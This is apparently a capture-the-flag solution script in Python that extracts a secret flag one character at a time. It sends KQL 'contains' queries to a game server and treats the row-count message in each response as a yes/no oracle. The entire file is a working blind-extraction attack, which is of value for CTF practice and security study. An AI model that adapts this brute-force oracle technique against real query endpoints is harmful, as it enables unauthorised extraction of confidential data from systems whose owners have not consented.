import requests
import string
import re

def brute(url, query, word):
    for i in range(50):
        for letter in string.digits + string.ascii_lowercase + "_-?!}" + string.ascii_uppercase:
            # Use replace placaolder with payload
            query_to_run = query.replace("$$", word+letter)

            response = requests.post(url, { "query": query_to_run})
            if response.status_code == 200:
                # Regex match to see if there was a result
                if re.search(r'<h2>The row count for your query was \d+', response.text):
                    word += letter
                    print(word)
                    if(letter == "}"): return
                    break

brute("https://kqlgame.ept.gg/game", 'Users | where * contains "$$" and * contains "}"', "ept{")